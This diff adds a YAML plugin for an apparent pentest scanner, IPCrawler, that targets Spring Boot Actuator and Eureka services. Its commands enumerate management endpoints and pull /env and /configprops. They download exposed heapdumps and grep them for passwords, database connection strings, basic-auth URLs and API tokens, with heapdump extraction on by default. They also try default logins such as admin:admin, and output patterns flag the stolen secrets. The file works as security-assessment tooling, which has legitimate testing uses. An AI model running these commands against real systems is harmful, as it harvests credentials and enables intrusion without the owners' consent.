@@ -1,0 +1,579 @@
+metadata:
+  name: "Spring Boot Actuator Security Scanner"
+  description: "Comprehensive Spring Boot security assessment with automated credential extraction and vulnerability detection"
+  type: "servicescan"
+  priority: 5
+  version: "1.0"
+  author: "IPCrawler YAML Plugin System"
+
+conditions:
+  services:
+    include: ["^http", "^https", "^unknown$"]
+    exclude: ["^nacn_http$"]
+  ports:
+    include: [80, 443, 8080, 8443, 9000, 3000]
+  when:
+    custom_condition: "spring_boot_detected or force_scan"
+
+options:
+  - name: "force_scan"
+    type: "boolean"
+    default: false
+    help: "Force Spring Boot enumeration on all HTTP services regardless of detection"
+  - name: "threads"
+    type: "integer"
+    default: 10
+    help: "Number of threads for endpoint enumeration"
+  - name: "timeout"
+    type: "integer"
+    default: 5
+    help: "Request timeout in seconds"
+  - name: "vhost_mode"
+    type: "choice"
+    choices: ["all", "best", "smart"]
+    default: "smart"
+    help: "How to handle multiple discovered hostnames"
+  - name: "extract_heapdump"
+    type: "boolean"
+    default: true
+    help: "Automatically extract credentials from accessible heapdumps"
+  - name: "common_paths"
+    type: "string"
+    default: "/,/actuator,/actuator/health,/actuator/info,/actuator/env,/actuator/beans,/actuator/configprops,/actuator/mappings,/actuator/metrics,/actuator/heapdump,/actuator/threaddump,/actuator/trace,/actuator/dump,/actuator/features,/actuator/loggers,/actuator/shutdown,/actuator/refresh,/manage,/management,/admin,/health,/info,/status,/eureka,/eureka/apps,/eureka/status,/v2/apps,/eureka/apps/delta,/error,/trace,/dump,/autoconfig,/beans,/configprops"
+    help: "Common Spring Boot and Eureka management endpoints to check (comma-separated)"
+
+execution:
+  commands:
+    # Spring Boot detection phase
+    - name: "spring_boot_detection"
+      condition: "true"
+      command: |
+        echo "=== Spring Boot Detection Phase ===" &&
+        for hostname in {all_hostnames}; do
+          echo "Testing hostname: $hostname" &&
+          # Quick actuator endpoint check
+          curl -s -I -m {timeout} {http_scheme}://$hostname:{port}/actuator 2>&1 | head -5 &&
+          # Quick main page check for Spring indicators
+          curl -s -m {timeout} {http_scheme}://$hostname:{port}/ 2>&1 | head -10 | grep -iE "(spring|boot|whitelabel|eureka|netflix)" || true
+        done
+      timeout: 60
+      output_file: "{protocol}_{port}_{http_scheme}_spring_detection.txt"
+    
+    # Comprehensive endpoint enumeration
+    - name: "actuator_endpoint_enumeration"
+      condition: "spring_boot_detected"
+      command: |
+        echo "=== Spring Boot Actuator Endpoint Enumeration ===" &&
+        for hostname in {all_hostnames}; do
+          echo "=== Scanning hostname: $hostname ===" &&
+          for endpoint in {common_paths}; do
+            echo "=== Checking: {http_scheme}://$hostname:{port}$endpoint ===" &&
+            if [[ "$endpoint" == *"heapdump"* || "$endpoint" == *"threaddump"* ]]; then
+              # Use HEAD request for binary endpoints
+              curl -s -I -m {timeout} "{http_scheme}://$hostname:{port}$endpoint" -H "User-Agent: Mozilla/5.0 (compatible; IPCrawler)" 2>&1 || echo "Connection failed"
+              echo "Note: Using HEAD request to avoid binary download"
+            else
+              # Normal GET request for text endpoints
+              curl -s -m {timeout} "{http_scheme}://$hostname:{port}$endpoint" -H "User-Agent: Mozilla/5.0 (compatible; IPCrawler)" 2>&1 || echo "Connection failed"
+            fi
+            echo ""
+          done
+        done
+      timeout: 300
+      output_file: "{protocol}_{port}_{http_scheme}_spring_endpoints.txt"
+    
+    # Environment variable exposure check
+    - name: "environment_exposure_check"
+      condition: "spring_boot_detected"
+      command: |
+        echo "=== Environment Variable Exposure Check ===" &&
+        for hostname in {all_hostnames}; do
+          echo "=== Testing /env endpoint on $hostname ===" &&
+          curl -s -m {timeout} {http_scheme}://$hostname:{port}/env 2>&1 &&
+          echo "=== Testing /actuator/env on $hostname ===" &&
+          curl -s -m {timeout} {http_scheme}://$hostname:{port}/actuator/env 2>&1 &&
+          echo "=== Testing with different headers on $hostname ===" &&
+          curl -s -m {timeout} -H "Accept: text/plain" {http_scheme}://$hostname:{port}/actuator/env 2>&1
+        done
+      timeout: 120
+      output_file: "{protocol}_{port}_{http_scheme}_spring_env.txt"
+    
+    # Configuration properties exposure
+    - name: "config_properties_check"
+      condition: "spring_boot_detected"
+      command: |
+        echo "=== Configuration Properties Exposure Check ===" &&
+        for hostname in {all_hostnames}; do
+          echo "=== Testing /actuator/configprops on $hostname ===" &&
+          curl -s -m {timeout} {http_scheme}://$hostname:{port}/actuator/configprops 2>&1 &&
+          echo "=== Testing /configprops on $hostname ===" &&
+          curl -s -m {timeout} {http_scheme}://$hostname:{port}/configprops 2>&1
+        done
+      timeout: 120
+      output_file: "{protocol}_{port}_{http_scheme}_spring_config.txt"
+    
+    # Heapdump availability and credential extraction
+    - name: "heapdump_credential_extraction"
+      condition: "spring_boot_detected and extract_heapdump"
+      command: |
+        echo "=== Heapdump Credential Extraction ===" &&
+        for hostname in {all_hostnames}; do
+          echo "=== Testing heapdump on $hostname ===" &&
+          hostname_label=$(echo "$hostname" | tr '.:' '__') &&
+          heapdump_check=$(curl -s -I -m {timeout} {http_scheme}://$hostname:{port}/actuator/heapdump 2>&1) &&
+          echo "$heapdump_check" &&
+          if echo "$heapdump_check" | grep -qi "200 ok"; then
+            echo "🚨 CRITICAL: Heapdump endpoint accessible on $hostname!" &&
+            echo "🔍 Downloading and extracting credentials..." &&
+            heapdump_file="{scandir}/heapdump_{port}_$hostname_label.hprof" &&
+            creds_file="{scandir}/EXTRACTED_CREDENTIALS_{port}_$hostname_label.txt" &&
+            if curl -s -m 300 "{http_scheme}://$hostname:{port}/actuator/heapdump" -o "$heapdump_file" 2>/dev/null; then
+              if [ -f "$heapdump_file" ]; then
+                echo "HEAPDUMP_EXTRACTION_START" &&
+                # Extract password= patterns
+                strings "$heapdump_file" | grep -E "password=" | head -20 | while read line; do
+                  echo "CREDENTIAL_FOUND:PASSWORD:$line"
+                done &&
+                # Extract PWD environment variables
+                strings "$heapdump_file" | grep -E "PWD" | head -15 | while read line; do
+                  echo "CREDENTIAL_FOUND:PWD:$line"
+                done &&
+                # Extract Eureka/microservice credentials
+                strings "$heapdump_file" | grep -E "(EurekaSrvr.*@|://.*:.*@.*:8761)" | head -10 | while read line; do
+                  echo "CREDENTIAL_FOUND:EUREKA:$line"
+                done &&
+                # Extract HTTP Basic Auth URLs
+                strings "$heapdump_file" | grep -E "://[^:]+:[^@]+@[^/]+" | head -15 | while read line; do
+                  echo "CREDENTIAL_FOUND:HTTP_AUTH:$line"
+                done &&
+                # Extract database connection strings
+                strings "$heapdump_file" | grep -E "jdbc:[^:]+://[^:]*:[^@]*@" | head -10 | while read line; do
+                  echo "CREDENTIAL_FOUND:DATABASE:$line"
+                done &&
+                # Extract user= patterns
+                strings "$heapdump_file" | grep -E "user=" | head -15 | while read line; do
+                  echo "CREDENTIAL_FOUND:USER:$line"
+                done &&
+                echo "HEAPDUMP_EXTRACTION_END" &&
+                echo "SUCCESS: Credentials extracted from heapdump"
+              else
+                echo "ERROR: Heapdump file not created"
+              fi
+            else
+              echo "ERROR: Failed to download heapdump"
+            fi
+          else
+            echo "❌ Heapdump endpoint not accessible on $hostname"
+          fi
+        done
+      timeout: 600
+      output_file: "{protocol}_{port}_{http_scheme}_heapdump_extraction.txt"
+    
+    # Authentication bypass testing
+    - name: "authentication_bypass_test"
+      condition: "spring_boot_detected"
+      command: |
+        echo "=== Authentication Bypass Testing ===" &&
+        for hostname in {all_hostnames}; do
+          echo "=== Testing admin:admin on $hostname ===" &&
+          curl -v -s -m {timeout} -u admin:admin {http_scheme}://$hostname:{port}/ 2>&1 &&
+          echo "=== Testing default:default on $hostname ===" &&
+          curl -v -s -m {timeout} -u default:default {http_scheme}://$hostname:{port}/ 2>&1 &&
+          echo "=== Testing empty credentials on $hostname ===" &&
+          curl -v -s -m {timeout} -u : {http_scheme}://$hostname:{port}/ 2>&1
+        done
+      timeout: 120
+      output_file: "{protocol}_{port}_{http_scheme}_auth_bypass.txt"
+    
+    # Error page information disclosure
+    - name: "error_page_disclosure"
+      condition: "spring_boot_detected"
+      command: |
+        echo "=== Error Page Information Disclosure ===" &&
+        for hostname in {all_hostnames}; do
+          echo "=== Testing /error endpoint on $hostname ===" &&
+          curl -v -m {timeout} {http_scheme}://$hostname:{port}/error -H "User-Agent: Mozilla/5.0 (compatible; IPCrawler)" 2>&1
+        done
+      timeout: 60
+      output_file: "{protocol}_{port}_{http_scheme}_error_disclosure.txt"
+
+  manual_commands:
+    # Basic Spring Boot enumeration
+    - description: "(spring-boot) Basic connectivity and actuator test"
+      command: "curl -s -I {http_scheme}://{hostname}:{port}/actuator"
+    
+    - description: "(spring-boot) Check all common actuator endpoints"
+      command: |
+        for endpoint in /actuator /actuator/health /actuator/info /actuator/env /actuator/beans /actuator/heapdump; do
+          echo "=== $endpoint ===";
+          curl -s {http_scheme}://{hostname}:{port}$endpoint;
+          echo "";
+        done
+    
+    # Critical heapdump credential extraction
+    - description: "(spring-boot) CRITICAL: Download and analyze heapdump for credentials"
+      command: |
+        curl -s {http_scheme}://{hostname}:{port}/actuator/heapdump -o heapdump_{port}.hprof &&
+        echo "=== Password patterns ===" &&
+        strings heapdump_{port}.hprof | grep "password=" | head -20 &&
+        echo "=== PWD environment variables ===" &&
+        strings heapdump_{port}.hprof | grep "PWD" | head -15 &&
+        echo "=== Eureka/microservice credentials ===" &&
+        strings heapdump_{port}.hprof | grep -iE "EurekaSrvr.*@|://.*:.*@.*:8761" | head -10 &&
+        echo "=== User/password pairs ===" &&
+        strings heapdump_{port}.hprof | grep -iE "{password=.*&.*user=|user=.*password=}" | head -10 &&
+        echo "=== HTTP Basic Auth URLs ===" &&
+        strings heapdump_{port}.hprof | grep -iE "://.*:.*@" | head -10 &&
+        echo "=== Database connection strings ===" &&
+        strings heapdump_{port}.hprof | grep -i "jdbc:" | head -10 &&
+        echo "=== API keys and tokens ===" &&
+        strings heapdump_{port}.hprof | grep -iE "(api.?key|secret|token)" | head -15
+    
+    # Environment variable extraction
+    - description: "(spring-boot) Extract environment variables and configuration"
+      command: |
+        curl -s {http_scheme}://{hostname}:{port}/actuator/env > spring_env.json &&
+        curl -s {http_scheme}://{hostname}:{port}/actuator/configprops > spring_config.json &&
+        echo "Environment and configuration downloaded"
+    
+    # Authentication testing
+    - description: "(spring-boot) Test common default credentials"
+      command: |
+        curl -s -u admin:admin {http_scheme}://{hostname}:{port}/ &&
+        curl -s -u admin:password {http_scheme}://{hostname}:{port}/ &&
+        curl -s -u spring:spring {http_scheme}://{hostname}:{port}/
+    
+    # Management interface discovery
+    - description: "(spring-boot) Check for management interfaces"
+      command: |
+        curl -s {http_scheme}://{hostname}:{port}/manage &&
+        curl -s {http_scheme}://{hostname}:{port}/admin &&
+        curl -s {http_scheme}://{hostname}:{port}/management
+    
+    # Eureka service discovery
+    - description: "(spring-boot) Eureka service discovery enumeration"
+      command: |
+        curl -s {http_scheme}://{hostname}:{port}/eureka/apps &&
+        curl -s {http_scheme}://{hostname}:{port}/v2/apps &&
+        curl -s {http_scheme}://{hostname}:{port}/eureka/status
+
+output:
+  patterns:
+    # Spring Boot Framework Detection
+    - pattern: "(?i)spring-boot[/-]?v?(\\d+\\.\\d+\\.\\d+)"
+      description: "Spring Boot Framework v{match1} detected - modern Java microservice platform"
+      severity: "info"
+      category: "framework"
+    
+    - pattern: "(?i)whitelabel.error.page|default.error.view"
+      description: "Spring Boot Default Error Page exposed - potential information disclosure"
+      severity: "medium"
+      category: "information_disclosure"
+    
+    - pattern: "(?i)org\\.springframework\\.boot"
+      description: "Spring Boot Framework classes detected - Java enterprise application"
+      severity: "info"
+      category: "framework"
+    
+    # Netflix Eureka Service Discovery
+    - pattern: "(?i)eureka.instance.hostname[:\\s]*([^\\s,\\n]+)"
+      description: "Netflix Eureka Service Discovery - hostname: {match1}"
+      severity: "info"
+      category: "service_discovery"
+    
+    - pattern: "(?i)eureka.client.service-url.defaultZone[:\\s]*([^\\s,\\n]+)"
+      description: "Eureka Default Zone URL: {match1} - service registry endpoint"
+      severity: "medium"
+      category: "service_discovery"
+    
+    - pattern: "(?i)\"name\"\\s*:\\s*\"([^\"]*eureka[^\"]*)\""
+      description: "Eureka Service Instance: {match1} - microservice registration"
+      severity: "info"
+      category: "service_discovery"
+    
+    - pattern: "(?i)netflix.eureka|service.registry"
+      description: "Netflix Eureka Service Registry detected - microservices architecture"
+      severity: "info"
+      category: "service_discovery"
+    
+    # Spring Boot Actuator Endpoints (Critical Security Findings)
+    - pattern: "(?i)\"/actuator/env\""
+      description: "CRITICAL: Spring Actuator /env endpoint exposed - environment variables disclosure"
+      severity: "critical"
+      category: "information_disclosure"
+    
+    - pattern: "(?i)\"/actuator/configprops\""
+      description: "CRITICAL: Spring Actuator /configprops endpoint exposed - configuration properties disclosure"
+      severity: "critical"
+      category: "information_disclosure"
+    
+    - pattern: "(?i)\"/actuator/beans\""
+      description: "WARNING: Spring Actuator /beans endpoint exposed - application context disclosure"
+      severity: "high"
+      category: "information_disclosure"
+    
+    - pattern: "(?i)\"/actuator/mappings\""
+      description: "INFO: Spring Actuator /mappings endpoint exposed - URL mappings disclosure"
+      severity: "medium"
+      category: "information_disclosure"
+    
+    - pattern: "(?i)\"/actuator/health\""
+      description: "INFO: Spring Actuator /health endpoint exposed - application health status"
+      severity: "info"
+      category: "monitoring"
+    
+    - pattern: "(?i)\"/actuator/info\""
+      description: "INFO: Spring Actuator /info endpoint exposed - application information"
+      severity: "info"
+      category: "monitoring"
+    
+    - pattern: "(?i)\"/actuator/metrics\""
+      description: "INFO: Spring Actuator /metrics endpoint exposed - application metrics"
+      severity: "info"
+      category: "monitoring"
+    
+    - pattern: "(?i)\"/actuator/trace\""
+      description: "CRITICAL: Spring Actuator /trace endpoint exposed - HTTP request traces"
+      severity: "critical"
+      category: "information_disclosure"
+    
+    - pattern: "(?i)\"/actuator/dump\""
+      description: "CRITICAL: Spring Actuator /dump endpoint exposed - thread dump disclosure"
+      severity: "critical"
+      category: "information_disclosure"
+    
+    - pattern: "(?i)\"/actuator/heapdump\""
+      description: "CRITICAL: Spring Actuator /heapdump endpoint exposed - memory dump disclosure"
+      severity: "critical"
+      category: "information_disclosure"
+    
+    - pattern: "(?i)management\\.endpoints\\.web\\.exposure\\.include[:\\s=]*([^\\s,\\n]+)"
+      description: "Spring Actuator Endpoints Enabled: {match1}"
+      severity: "medium"
+      category: "configuration"
+    
+    # Spring Security Detection
+    - pattern: "(?i)spring.security.oauth2|spring-security-oauth"
+      description: "Spring Security OAuth2 detected - authentication/authorization framework"
+      severity: "info"
+      category: "security"
+    
+    - pattern: "(?i)JSESSIONID=([A-F0-9]+)"
+      description: "Java Session ID detected: {match1} - session management active"
+      severity: "info"
+      category: "session"
+    
+    - pattern: "(?i)X-Frame-Options:\\s*([^\\n]+)"
+      description: "X-Frame-Options security header: {match1}"
+      severity: "info"
+      category: "security_headers"
+    
+    # Java Application Server Detection
+    - pattern: "(?i)server:\\s*apache-coyote.*tomcat[/-]?(\\d+\\.\\d+)"
+      description: "Apache Tomcat v{match1} detected - Java servlet container"
+      severity: "info"
+      category: "server"
+    
+    - pattern: "(?i)server:\\s*jetty[/-]?(\\d+\\.\\d+)"
+      description: "Eclipse Jetty v{match1} detected - Java HTTP server"
+      severity: "info"
+      category: "server"
+    
+    - pattern: "(?i)server:\\s*undertow[/-]?(\\d+\\.\\d+)"
+      description: "Undertow v{match1} detected - Java web server (WildFly)"
+      severity: "info"
+      category: "server"
+    
+    - pattern: "(?i)java.version[:\\s=]*([^\\s,\\n]+)"
+      description: "Java Runtime Version: {match1}"
+      severity: "info"
+      category: "version"
+    
+    - pattern: "(?i)java.vendor[:\\s=]*([^\\s,\\n]+)"
+      description: "Java Vendor: {match1}"
+      severity: "info"
+      category: "version"
+    
+    # Configuration and Database Exposure
+    - pattern: "(?i)spring.datasource.url[:\\s=]*([^\\s,\\n]+)"
+      description: "CRITICAL: Database Connection String exposed: {match1}"
+      severity: "critical"
+      category: "credentials"
+    
+    - pattern: "(?i)spring.datasource.username[:\\s=]*([^\\s,\\n]+)"
+      description: "WARNING: Database Username exposed: {match1}"
+      severity: "high"
+      category: "credentials"
+    
+    - pattern: "(?i)spring.profiles.active[:\\s=]*([^\\s,\\n]+)"
+      description: "Spring Active Profiles: {match1} - environment configuration"
+      severity: "info"
+      category: "configuration"
+    
+    # Heapdump Credential Extraction Patterns
+    - pattern: "password=([^&\\s,\\n}]+)"
+      description: "CRITICAL: Password credential found in heapdump: {match1}"
+      severity: "critical"
+      category: "credentials"
+    
+    - pattern: "{password=([^&]+)&[^}]*user=([^}]+)}"
+      description: "CRITICAL: User/Password pair found: user={match2}, password={match1}"
+      severity: "critical"
+      category: "credentials"
+    
+    - pattern: "EurekaSrvr:([^@]+)@([^:]+):(\\d+)"
+      description: "CRITICAL: Eureka Server credentials found: password={match1} host={match2}:{match3}"
+      severity: "critical"
+      category: "credentials"
+    
+    - pattern: "http://([^:]+):([^@]+)@([^:]+):8761"
+      description: "CRITICAL: Eureka HTTP Basic Auth: user={match1}, password={match2}, server={match3}:8761"
+      severity: "critical"
+      category: "credentials"
+    
+    - pattern: "PWD=([^\\s,\\n]+)"
+      description: "INFO: PWD environment variable: {match1}"
+      severity: "info"
+      category: "environment"
+    
+    # Additional credential patterns for raw memory extraction
+    - pattern: "user=([^&\\s,\\n}]+)"
+      description: "INFO: Username found in memory: {match1}"
+      severity: "info"
+      category: "credentials"
+    
+    - pattern: "username=([^&\\s,\\n}]+)"
+      description: "INFO: Username found in memory: {match1}"
+      severity: "info"
+      category: "credentials"
+    
+    - pattern: "jdbc:[^:]+://([^:]+):([^@]+)@([^:/]+)"
+      description: "CRITICAL: JDBC credentials found: user={match1}, password={match2}, host={match3}"
+      severity: "critical"
+      category: "credentials"
+    
+    - pattern: "://([^:]+):([^@]+)@([^:/]+):"
+      description: "CRITICAL: URL credentials found: user={match1}, password={match2}, host={match3}"
+      severity: "critical"
+      category: "credentials"
+    
+    # Automatic Heapdump Extraction Result Patterns
+    - pattern: "CREDENTIAL_FOUND:PASSWORD:(.+)"
+      description: "🔥 EXTRACTED PASSWORD FROM HEAPDUMP: {match1}"
+      severity: "critical"
+      category: "extracted_credentials"
+    
+    - pattern: "CREDENTIAL_FOUND:PWD:(.+)"
+      description: "🔥 EXTRACTED PWD VARIABLE FROM HEAPDUMP: {match1}"
+      severity: "high"
+      category: "extracted_credentials"
+    
+    - pattern: "CREDENTIAL_FOUND:EUREKA:(.+)"
+      description: "🔥 EXTRACTED EUREKA CREDENTIALS FROM HEAPDUMP: {match1}"
+      severity: "critical"
+      category: "extracted_credentials"
+    
+    - pattern: "CREDENTIAL_FOUND:HTTP_AUTH:(.+)"
+      description: "🔥 EXTRACTED HTTP AUTH URL FROM HEAPDUMP: {match1}"
+      severity: "critical"
+      category: "extracted_credentials"
+    
+    - pattern: "CREDENTIAL_FOUND:DATABASE:(.+)"
+      description: "🔥 EXTRACTED DATABASE CONNECTION FROM HEAPDUMP: {match1}"
+      severity: "critical"
+      category: "extracted_credentials"
+    
+    - pattern: "CREDENTIAL_FOUND:USER:(.+)"
+      description: "🔥 EXTRACTED USERNAME FROM HEAPDUMP: {match1}"
+      severity: "high"
+      category: "extracted_credentials"
+    
+    - pattern: "SUCCESS: Credentials extracted from heapdump"
+      description: "✅ HEAPDUMP CREDENTIAL EXTRACTION COMPLETED SUCCESSFULLY"
+      severity: "critical"
+      category: "extraction_success"
+    
+    # Cloud and Microservice Patterns
+    - pattern: "(?i)spring.cloud.config.server"
+      description: "Spring Cloud Config Server detected - centralized configuration management"
+      severity: "medium"
+      category: "cloud"
+    
+    - pattern: "(?i)spring.cloud.gateway"
+      description: "Spring Cloud Gateway detected - API gateway service"
+      severity: "info"
+      category: "cloud"
+    
+    - pattern: "(?i)spring.cloud.consul|spring.cloud.zookeeper"
+      description: "Spring Cloud Service Discovery detected - distributed systems"
+      severity: "info"
+      category: "cloud"
+    
+    # Vulnerability Patterns
+    - pattern: "(?i)spring.h2.console.enabled[:\\s=]*true"
+      description: "CRITICAL: H2 Database Console enabled - potential RCE vulnerability"
+      severity: "critical"
+      category: "vulnerability"
+    
+    - pattern: "(?i)management.security.enabled[:\\s=]*false"
+      description: "CRITICAL: Spring Actuator security disabled - unrestricted access"
+      severity: "critical"
+      category: "vulnerability"
+    
+    - pattern: "(?i)endpoints.env.enabled[:\\s=]*true"
+      description: "WARNING: Environment endpoint enabled - potential information disclosure"
+      severity: "high"
+      category: "vulnerability"
+    
+    # HTTP status analysis for Spring endpoints
+    - pattern: "(?i)HTTP/[12]\\.[01]\\s+200.*actuator"
+      description: "CRITICAL: Spring Actuator endpoint accessible via HTTP (200 OK)"
+      severity: "critical"
+      category: "http_status"
+    
+    - pattern: "(?i)HTTP/[12]\\.[01]\\s+403.*actuator"
+      description: "WARNING: Spring Actuator endpoint access forbidden but exists (403 Forbidden)"
+      severity: "medium"
+      category: "http_status"
+    
+    - pattern: "(?i)HTTP/[12]\\.[01]\\s+401.*actuator"
+      description: "WARNING: Spring Actuator endpoint requires authentication (401 Unauthorized)"
+      severity: "medium"
+      category: "http_status"
+
+  technology_detection:
+    - pattern: "(?i)Spring.*Boot[\\s]*([\\d\\.]+)"
+      technology: "Spring Boot"
+      version_group: 1
+    
+    - pattern: "(?i)Apache.*Tomcat[/-]([\\d\\.]+)"
+      technology: "Apache Tomcat"
+      version_group: 1
+    
+    - pattern: "(?i)Eclipse.*Jetty[/-]([\\d\\.]+)"
+      technology: "Eclipse Jetty"
+      version_group: 1
+    
+    - pattern: "(?i)Undertow[/-]([\\d\\.]+)"
+      technology: "Undertow"
+      version_group: 1
+    
+    - pattern: "(?i)Netflix.*Eureka"
+      technology: "Netflix Eureka"
+    
+    - pattern: "(?i)Spring.*Cloud"
+      technology: "Spring Cloud"
+
+requirements:
+  tools:
+    - name: "curl"
+      check_command: "curl --version"
+      install_hint: "apt-get install curl"
+    - name: "strings"
+      check_command: "strings --version"
+      install_hint: "apt-get install binutils"
+
+debug:
+  log_level: "info"
+  trace_decisions: true
+  show_command_output: false
